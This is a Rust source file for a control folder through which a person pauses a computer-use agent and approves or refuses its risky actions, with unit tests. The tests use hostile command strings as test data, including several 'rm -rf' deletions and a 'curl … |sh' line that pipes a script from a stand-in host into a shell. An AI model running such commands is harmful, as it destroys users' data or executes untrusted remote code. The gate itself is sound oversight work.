//! A run's control folder: how the person running an agent reaches whatever
//! does the actions -- this process (an API key's run), or the MCP server
//! that Codex or Claude Code started, in a process of its own (and, in
//! tests, a container of its own). Files, so every one of them can see it:
//!
//! - `pause`: while it exists, actions wait;
//! - `ask-N.json`: a step waiting for the person's go-ahead
//!   (`{"n": N, "action": "type \"rm -rf build\"", "why": "…", "from": "rule"}`):
//!   a risky action a rule or clef caught (`rule`), one the model asked
//!   about (`model`), any action when every one is to be approved
//!   (`every`), or a screen with personal information the model is to see
//!   (`screen`, whatever the approvals: see `judge`);
//! - `answer-N`: `yes` or `no`.
//!
//! Whoever can write in the folder answers, so it is used only if it is
//! this user's alone (`own_folder`).

use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use crate::providers::{Approvals, Ask};

const POLL: Duration = Duration::from_millis(200);
/// A yes to the model's own request covers the risky actions that carry it
/// out, for a while: the person is not asked twice for one step. Only those
/// the request quoted (`Step::quote`, `quotes`): a yes to one thing is no
/// yes to another.
const COVER_FOR: Duration = Duration::from_secs(120);
const COVER_ACTIONS: u32 = 3;

/// An input action at the gate.
pub struct Step<'a> {
    /// What the person is asked about: the whole action (`Action::in_full`).
    pub what: &'a str,
    /// What the log and the model's answers call it, with no typed text
    /// (`Action::for_log`).
    pub label: &'a str,
    /// What a yes to the model's own request must quote to cover it: the
    /// text it types, the keys it presses. None for a click or a drag: no
    /// words can be matched to what is under it, so it is asked again.
    pub quote: Option<&'a str>,
}

/// What a yes to the model's request still covers.
struct Cover {
    /// The request, as the person approved it.
    what: String,
    until: Instant,
    /// How many more risky actions.
    left: u32,
}

pub struct Control {
    dir: PathBuf,
    approvals: Approvals,
    next: u32,
    covered: Option<Cover>,
    /// Why `dir` is not used (see [`own_folder`]): nothing there is the
    /// person's, so every question is a no and no pause is heeded.
    refused: Option<String>,
}

impl Control {
    pub fn new(dir: PathBuf, approvals: Approvals) -> Control {
        let refused = own_folder(&dir).err();
        if let Some(e) = &refused {
            tracing::error!(error = e, "control folder not used; nobody can be asked");
        }
        // Numbered on from the clock: a turn's questions never share a
        // number with an earlier turn's in the same folder.
        let next = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| (d.as_millis() % 1_000_000_000) as u32)
            .unwrap_or(0);
        Control {
            dir,
            approvals,
            next,
            covered: None,
            refused,
        }
    }

    pub fn approvals(&self) -> Approvals {
        self.approvals
    }

    /// Before an input action: wait while paused, and for a yes when it is
    /// to be approved (`risk`: why a rule thinks it risky). `stop` says if
    /// the run must stop meanwhile (and why); `max_wait` is how long a
    /// person is waited for.
    pub fn gate(
        &mut self,
        step: &Step,
        risk: Option<&str>,
        stop: &dyn Fn() -> Option<String>,
        max_wait: Duration,
    ) -> Result<(), String> {
        let started = Instant::now();
        while self.refused.is_none() && self.dir.join("pause").exists() {
            if let Some(why) = stop() {
                return Err(why);
            }
            if started.elapsed() > max_wait {
                return Err(
                    "The person running you paused you and has not resumed you. \
                        Stop here and report where you are."
                        .into(),
                );
            }
            std::thread::sleep(POLL);
        }
        let (why, from) = match (self.approvals, risk) {
            (Approvals::Every, r) => (r.unwrap_or_default().to_string(), "every"),
            (Approvals::Risky, Some(r)) if !self.covers(step) => (r.to_string(), "rule"),
            _ => return Ok(()),
        };
        if self.ask(
            &Ask {
                what: step.what.to_string(),
                why,
            },
            step.label,
            from,
            stop,
            max_wait,
        )? {
            Ok(())
        } else {
            Err(format!(
                "The person said no to {}. Don't do it: do it another way, or stop \
                    and report.",
                step.label
            ))
        }
    }

    /// The model asks before a step (`ask_approval`): true if the person
    /// said yes. With approvals off, yes at once.
    pub fn request(
        &mut self,
        ask: &Ask,
        stop: &dyn Fn() -> Option<String>,
        max_wait: Duration,
    ) -> Result<bool, String> {
        if self.approvals == Approvals::Off {
            return Ok(true);
        }
        let yes = self.ask(ask, &ask.what, "model", stop, max_wait)?;
        self.covered = yes.then(|| Cover {
            what: ask.what.clone(),
            until: Instant::now() + COVER_FOR,
            left: COVER_ACTIONS,
        });
        Ok(yes)
    }

    /// Whether the model may see a screen clef finds personal information
    /// on (see `judge`): asked whatever the approvals, since it is about
    /// what leaves the computer, not what the agent does. Nobody answering
    /// in time is a no; only a stop is an error.
    pub fn show(
        &mut self,
        ask: &Ask,
        stop: &dyn Fn() -> Option<String>,
        max_wait: Duration,
    ) -> Result<bool, String> {
        match self.ask(ask, &ask.what, "screen", stop, max_wait) {
            Err(why) if stop().is_some() => Err(why),
            answer => Ok(answer.unwrap_or(false)),
        }
    }

    /// A yes to the model's request still covers a risky action, one it
    /// quoted (using it).
    fn covers(&mut self, step: &Step) -> bool {
        let Some(cover) = &mut self.covered else {
            return false;
        };
        if Instant::now() >= cover.until || cover.left == 0 {
            self.covered = None;
            return false;
        }
        if !step.quote.is_some_and(|q| quotes(&cover.what, q)) {
            return false;
        }
        cover.left -= 1;
        true
    }

    /// Put `ask` to the person and wait for the answer; `label` names it in
    /// the log and in what the model is told.
    fn ask(
        &mut self,
        ask: &Ask,
        label: &str,
        from: &str,
        stop: &dyn Fn() -> Option<String>,
        max_wait: Duration,
    ) -> Result<bool, String> {
        if self.refused.is_some() {
            tracing::warn!(from, action = label, "nobody can be asked");
            return Err(format!(
                "Nobody can be asked whether to {label}. Don't do it: stop here and report \
                    that it needs the person's go-ahead."
            ));
        }
        self.next += 1;
        let n = self.next;
        let started = Instant::now();
        let file = self.dir.join(format!("ask-{n}.json"));
        let answer = self.dir.join(format!("answer-{n}"));
        // An answer to an earlier turn's question of the same number, come
        // too late, is not this one's.
        let _ = std::fs::remove_file(&answer);
        let body = serde_json::json!({"n": n, "action": ask.what, "why": ask.why, "from": from});
        std::fs::write(&file, body.to_string()).map_err(|e| e.to_string())?;
        tracing::info!(
            n,
            from,
            action = label,
            why = ask.why,
            "waiting for the person's yes"
        );
        let result = loop {
            // Empty: made and not written yet (`answer` renames it into
            // place whole; another writer may not).
            if let Some(a) = std::fs::read_to_string(&answer)
                .ok()
                .filter(|a| !a.trim().is_empty())
            {
                let yes = a.trim() == "yes";
                tracing::info!(
                    n,
                    yes,
                    secs = started.elapsed().as_secs(),
                    "the person answered"
                );
                break Ok(yes);
            }
            if let Some(why) = stop() {
                break Err(why);
            }
            if started.elapsed() > max_wait {
                break Err(format!(
                    "Nobody answered whether to {label} (waited {} minutes). Don't do it: \
                        stop here and report that it needs the person's go-ahead.",
                    started.elapsed().as_secs() / 60
                ));
            }
            std::thread::sleep(POLL);
        };
        let _ = std::fs::remove_file(&file);
        let _ = std::fs::remove_file(&answer);
        result
    }
}

/// Make `dir` a control folder of this user's alone, or say why it cannot
/// be one: whoever can write in it answers the questions. On Unix it is
/// made 0700 (with any folder it needs above it), and used only if it is a
/// folder of this user's, not a link to one.
fn own_folder(dir: &Path) -> Result<(), String> {
    #[cfg(unix)]
    {
        extern "C" {
            fn geteuid() -> u32;
        }
        // SAFETY: geteuid takes nothing and always succeeds.
        own_folder_of(dir, unsafe { geteuid() })
    }
    #[cfg(not(unix))]
    {
        // Windows: Helio's data folder and %TEMP% are in the user's own
        // profile, which other users cannot open.
        std::fs::create_dir_all(dir).map_err(|e| format!("{}: {e}", dir.display()))
    }
}

/// [`own_folder`] for the user `uid`.
#[cfg(unix)]
fn own_folder_of(dir: &Path, uid: u32) -> Result<(), String> {
    use std::os::unix::fs::{DirBuilderExt, MetadataExt, PermissionsExt};
    let err = |e: std::io::Error| format!("{}: {e}", dir.display());
    std::fs::DirBuilder::new()
        .recursive(true)
        .mode(0o700)
        .create(dir)
        .map_err(err)?;
    let meta = std::fs::symlink_metadata(dir).map_err(err)?;
    if !meta.file_type().is_dir() {
        return Err(format!("{} is a link, not a folder", dir.display()));
    }
    if meta.uid() != uid {
        return Err(format!("{} belongs to another user", dir.display()));
    }
    std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700)).map_err(err)
}

/// Whether the model's `request` names `part` (a text to type, keys to
/// press) exactly: as a piece of it in backticks or double quotes, or, for
/// one word such as a chord, as a word of it. Runs of spaces and line ends
/// count as one space, and case does not count; a part of a quoted piece
/// does not count either (`rm -rf ~` is not in "`rm -rf ~/tmp/x`").
fn quotes(request: &str, part: &str) -> bool {
    let plain = |s: &str| {
        s.split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
            .to_lowercase()
    };
    let part = plain(part);
    if part.is_empty() {
        return false;
    }
    let mut pieces = Vec::new();
    for (open, close) in [('`', '`'), ('"', '"'), ('\u{201c}', '\u{201d}')] {
        let mut rest = request;
        while let Some(start) = rest.find(open) {
            let after = &rest[start + open.len_utf8()..];
            let Some(len) = after.find(close) else { break };
            pieces.push(&after[..len]);
            rest = &after[len + close.len_utf8()..];
        }
    }
    let words = request
        .split_whitespace()
        .map(|w| w.trim_matches(|c: char| ".,;:!?()[]{}\"'`\u{201c}\u{201d}".contains(c)));
    pieces.into_iter().chain(words).any(|q| plain(q) == part)
}

/// Pause the run whose control folder is `dir`, or let it go on.
pub fn set_paused(dir: &Path, paused: bool) {
    let p = dir.join("pause");
    if paused {
        let _ = std::fs::create_dir_all(dir);
        let _ = std::fs::write(p, "");
    } else {
        let _ = std::fs::remove_file(p);
    }
}

/// Steps waiting for an answer: (number, what and why).
pub fn pending(dir: &Path) -> Vec<(u32, Ask)> {
    let mut out: Vec<(u32, Ask)> = std::fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            let name = e.file_name().to_string_lossy().to_string();
            let n: u32 = name
                .strip_prefix("ask-")?
                .strip_suffix(".json")?
                .parse()
                .ok()?;
            if dir.join(format!("answer-{n}")).exists() {
                return None;
            }
            let v: serde_json::Value =
                serde_json::from_str(&std::fs::read_to_string(e.path()).ok()?).ok()?;
            let what = v["action"].as_str()?.to_string();
            Some((
                n,
                Ask {
                    what,
                    why: v["why"].as_str().unwrap_or_default().to_string(),
                },
            ))
        })
        .collect();
    out.sort_by_key(|(n, _)| *n);
    out
}

pub fn answer(dir: &Path, n: u32, yes: bool) {
    // Written aside and renamed into place: the gate never reads it half
    // made.
    let aside = dir.join(format!(".answer-{n}"));
    if std::fs::write(&aside, if yes { "yes" } else { "no" }).is_ok() {
        let _ = std::fs::rename(&aside, dir.join(format!("answer-{n}")));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const WAIT: Duration = Duration::from_secs(120);

    fn step<'a>(what: &'a str, label: &'a str) -> Step<'a> {
        Step {
            what,
            label,
            quote: None,
        }
    }

    /// A step that types or presses `quote`.
    fn quoting<'a>(what: &'a str, label: &'a str, quote: &'a str) -> Step<'a> {
        Step {
            quote: Some(quote),
            ..step(what, label)
        }
    }

    /// Answer the asks in `dir` in turn with `answers`, as the person would.
    fn answerer(dir: PathBuf, answers: Vec<bool>) -> std::thread::JoinHandle<Vec<Ask>> {
        std::thread::spawn(move || {
            let mut seen = Vec::new();
            for yes in answers {
                loop {
                    if let Some((n, ask)) = pending(&dir).into_iter().next() {
                        seen.push(ask);
                        answer(&dir, n, yes);
                        while dir.join(format!("answer-{n}")).exists() {
                            std::thread::sleep(Duration::from_millis(5));
                        }
                        break;
                    }
                    std::thread::sleep(Duration::from_millis(5));
                }
            }
            seen
        })
    }

    #[test]
    fn every_action_waits_for_its_answer_and_a_pause() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().to_path_buf();
        let mut c = Control::new(d.clone(), Approvals::Every);
        let person = answerer(d.clone(), vec![false, true]);
        let none = || None;
        assert!(c
            .gate(
                &step("left_click (1, 1)", "left_click (1, 1)"),
                None,
                &none,
                WAIT
            )
            .unwrap_err()
            .contains("said no"));
        c.gate(
            &step("left_click (2, 2)", "left_click (2, 2)"),
            None,
            &none,
            WAIT,
        )
        .unwrap();
        let seen = person.join().unwrap();
        assert_eq!(
            seen.iter().map(|a| a.what.as_str()).collect::<Vec<_>>(),
            ["left_click (1, 1)", "left_click (2, 2)"]
        );
        // A pause holds the next action until lifted.
        set_paused(&d, true);
        let lift = {
            let d = d.clone();
            std::thread::spawn(move || {
                std::thread::sleep(Duration::from_millis(300));
                set_paused(&d, false);
            })
        };
        let t = Instant::now();
        c.approvals = Approvals::Off;
        c.gate(
            &step("left_click (3, 3)", "left_click (3, 3)"),
            None,
            &none,
            WAIT,
        )
        .unwrap();
        assert!(
            t.elapsed() >= Duration::from_millis(250),
            "{:?}",
            t.elapsed()
        );
        lift.join().unwrap();
        assert!(pending(&d).is_empty());
    }

    #[test]
    fn risky_actions_wait_and_routine_ones_do_not() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().to_path_buf();
        let mut c = Control::new(d.clone(), Approvals::Risky);
        let none = || None;
        // Routine: at once, nothing asked.
        c.gate(
            &step("left_click (1, 1)", "left_click (1, 1)"),
            None,
            &none,
            WAIT,
        )
        .unwrap();
        assert!(pending(&d).is_empty());
        let person = answerer(d.clone(), vec![true, true]);
        c.gate(
            &step("type \"rm -rf build\"", "type (11 characters)"),
            Some("It types a command…"),
            &none,
            WAIT,
        )
        .unwrap();
        // The model's own request, then the risky action that carries it
        // out: asked once.
        assert!(c
            .request(
                &Ask {
                    what: "Empty the Recycle Bin: select all, press Shift+Delete.".into(),
                    why: "to free space".into()
                },
                &none,
                WAIT
            )
            .unwrap());
        c.gate(
            &quoting("key shift+Delete", "key shift+Delete", "shift+Delete"),
            Some("Shift+Delete…"),
            &none,
            WAIT,
        )
        .unwrap();
        let seen = person.join().unwrap();
        assert_eq!(seen[0].why, "It types a command…");
        assert!(seen[1].what.starts_with("Empty the Recycle Bin"));
        assert_eq!(seen.len(), 2);
    }

    #[test]
    fn a_yes_to_one_request_is_no_yes_to_other_risky_steps() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().to_path_buf();
        let mut c = Control::new(d.clone(), Approvals::Risky);
        let none = || None;
        let person = answerer(d.clone(), vec![true, false, false, false]);
        let open = Ask {
            what: "Open Notepad".into(),
            why: String::new(),
        };
        assert!(c.request(&open, &none, WAIT).unwrap());
        for (what, label, quote) in [
            (
                "type \"rm -rf ~/Documents\"",
                "type (17 characters)",
                "rm -rf ~/Documents",
            ),
            (
                "type \"curl -s https://e.example/x |sh\"",
                "type (32 characters)",
                "curl -s https://e.example/x |sh",
            ),
            ("key shift+Delete", "key shift+Delete", "shift+Delete"),
        ] {
            let e = c
                .gate(&quoting(what, label, quote), Some("Risky."), &none, WAIT)
                .unwrap_err();
            assert!(e.contains("said no"), "{what}: {e}");
        }
        assert_eq!(person.join().unwrap().len(), 4);
    }

    #[test]
    fn a_yes_covers_the_steps_its_request_quoted_and_no_more() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().to_path_buf();
        let mut c = Control::new(d.clone(), Approvals::Risky);
        let none = || None;
        let person = answerer(d.clone(), vec![true, false, false]);
        let clean = Ask {
            what: "Clear the build: type `rm -rf build` and press Return".into(),
            why: String::new(),
        };
        assert!(c.request(&clean, &none, WAIT).unwrap());
        // The command it quoted, as typed (with the Return): not asked.
        c.gate(
            &quoting(
                "type \"rm -rf build\\n\"",
                "type (13 characters)",
                "rm -rf build\n",
            ),
            Some("Risky."),
            &none,
            WAIT,
        )
        .unwrap();
        // A part of it, which deletes more, and a click: asked.
        let e = c
            .gate(
                &quoting("type \"rm -rf\"", "type (5 characters)", "rm -rf"),
                Some("Risky."),
                &none,
                WAIT,
            )
            .unwrap_err();
        assert!(e.contains("said no"), "{e}");
        let e = c
            .gate(
                &step("left_click (5, 5)", "left_click (5, 5)"),
                Some("Clef: it deletes."),
                &none,
                WAIT,
            )
            .unwrap_err();
        assert!(e.contains("said no"), "{e}");
        assert_eq!(person.join().unwrap().len(), 3);
    }

    #[test]
    fn a_request_quotes_whole_pieces_and_words_only() {
        let request = "Type `rm -rf ~/tmp/x` and press \"Shift+Delete\", then hunter2.";
        assert!(quotes(request, "rm -rf ~/tmp/x"));
        assert!(quotes(request, "  rm  -rf ~/tmp/x\n"));
        assert!(quotes(request, "shift+delete"));
        assert!(quotes(request, "hunter2"));
        assert!(!quotes(request, "rm -rf ~"));
        assert!(!quotes(request, "rm -rf"));
        assert!(!quotes(request, "Type rm"));
        assert!(!quotes(request, " \n"));
        assert!(quotes("press ctrl+alt+Delete.", "ctrl+alt+Delete"));
        assert!(quotes(
            "type \u{201c}DROP TABLE users;\u{201d}",
            "DROP TABLE users;"
        ));
    }

    #[test]
    fn with_approvals_off_nothing_waits() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = Control::new(dir.path().to_path_buf(), Approvals::Off);
        let none = || None;
        c.gate(
            &step("type \"rm -rf /\"", "type (8 characters)"),
            Some("…"),
            &none,
            WAIT,
        )
        .unwrap();
        assert!(c
            .request(
                &Ask {
                    what: "anything".into(),
                    why: String::new()
                },
                &none,
                WAIT
            )
            .unwrap());
    }

    #[test]
    fn a_screen_is_asked_about_whatever_the_approvals_and_silence_is_a_no() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().to_path_buf();
        let mut c = Control::new(d.clone(), Approvals::Off);
        let ask = Ask {
            what: "Show the model this screen".into(),
            why: "Clef finds payment or bank details on it.".into(),
        };
        let none = || None;
        let person = answerer(d.clone(), vec![true]);
        assert!(c.show(&ask, &none, WAIT).unwrap());
        assert_eq!(person.join().unwrap(), vec![ask.clone()]);
        assert!(!c.show(&ask, &none, Duration::from_millis(50)).unwrap());
        assert!(pending(&d).is_empty());
        let e = c.show(&ask, &|| Some("Stopped.".into()), WAIT).unwrap_err();
        assert_eq!(e, "Stopped.");
    }

    #[cfg(unix)]
    #[test]
    fn a_control_folder_is_the_users_alone_or_nothing_is_asked_there() {
        use std::os::unix::fs::PermissionsExt;
        use std::sync::atomic::{AtomicBool, Ordering};
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        let dir = tempfile::tempdir().unwrap();
        // A folder someone else made, where whoever writes answers: a link
        // to one stands for it here (a test has one user).
        let theirs = dir.path().join("theirs");
        std::fs::create_dir(&theirs).unwrap();
        let link = dir.path().join("control");
        std::os::unix::fs::symlink(&theirs, &link).unwrap();
        let done = std::sync::Arc::new(AtomicBool::new(false));
        let stranger = {
            let (theirs, done) = (theirs.clone(), done.clone());
            std::thread::spawn(move || {
                while !done.load(Ordering::Relaxed) {
                    for (n, _) in pending(&theirs) {
                        answer(&theirs, n, true);
                    }
                    std::thread::sleep(Duration::from_millis(5));
                }
            })
        };
        let mut c = Control::new(link.clone(), Approvals::Risky);
        let gate = c.gate(
            &step("type \"rm -rf ~\"", "type (8 characters)"),
            Some("deletes files"),
            &|| None,
            Duration::from_secs(5),
        );
        done.store(true, Ordering::Relaxed);
        stranger.join().unwrap();
        assert!(gate.is_err(), "a yes from a folder not the user's");
        assert!(std::fs::read_dir(&theirs).unwrap().next().is_none());
        // The user's own, left open to others, is closed; a new one is made
        // private.
        let open = dir.path().join("open");
        std::fs::create_dir(&open).unwrap();
        std::fs::set_permissions(&open, std::fs::Permissions::from_mode(0o777)).unwrap();
        Control::new(open.clone(), Approvals::Risky);
        assert_eq!(mode(&open), 0o700);
        let new = dir.path().join("a").join("control");
        Control::new(new.clone(), Approvals::Risky);
        assert_eq!(mode(&new), 0o700);
        // One of another user's is not used, nor changed.
        let uid = std::os::unix::fs::MetadataExt::uid(&std::fs::metadata(&new).unwrap());
        std::fs::set_permissions(&open, std::fs::Permissions::from_mode(0o777)).unwrap();
        let e = own_folder_of(&open, uid + 1).unwrap_err();
        assert!(e.contains("another user"), "{e}");
        assert_eq!(mode(&open), 0o777);
        assert!(own_folder_of(&open, uid).is_ok());
    }

    #[test]
    fn an_answer_is_read_once_written_whole() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().to_path_buf();
        // The moment between an answer file's creation and its text, held
        // longer than the gate's poll so the gate sees it.
        let person = std::thread::spawn({
            let d = d.clone();
            move || loop {
                if let Some((n, _)) = pending(&d).into_iter().next() {
                    let file = d.join(format!("answer-{n}"));
                    std::fs::write(&file, "").unwrap();
                    std::thread::sleep(POLL * 2);
                    std::fs::write(&file, "yes").unwrap();
                    return;
                }
                std::thread::sleep(Duration::from_millis(5));
            }
        });
        let mut c = Control::new(d.clone(), Approvals::Every);
        let gate = c.gate(&step("key Return", "key Return"), None, &|| None, WAIT);
        person.join().unwrap();
        assert_eq!(gate, Ok(()));
        // And `answer` writes it whole: never an empty file under its name.
        answer(&d, 7, true);
        assert_eq!(std::fs::read_to_string(d.join("answer-7")).unwrap(), "yes");
        assert_eq!(std::fs::read_dir(&d).unwrap().count(), 1);
    }

    #[test]
    fn a_stopped_run_does_not_wait() {
        let dir = tempfile::tempdir().unwrap();
        set_paused(dir.path(), true);
        let mut c = Control::new(dir.path().to_path_buf(), Approvals::Off);
        let e = c
            .gate(
                &step("key Return", "key Return"),
                None,
                &|| Some("Stopped.".into()),
                WAIT,
            )
            .unwrap_err();
        assert_eq!(e, "Stopped.");
        let mut c = Control::new(dir.path().to_path_buf(), Approvals::Risky);
        set_paused(dir.path(), false);
        let e = c
            .gate(
                &step("key shift+Delete", "key shift+Delete"),
                Some("…"),
                &|| Some("Stopped.".into()),
                WAIT,
            )
            .unwrap_err();
        assert_eq!(e, "Stopped.");
    }
}
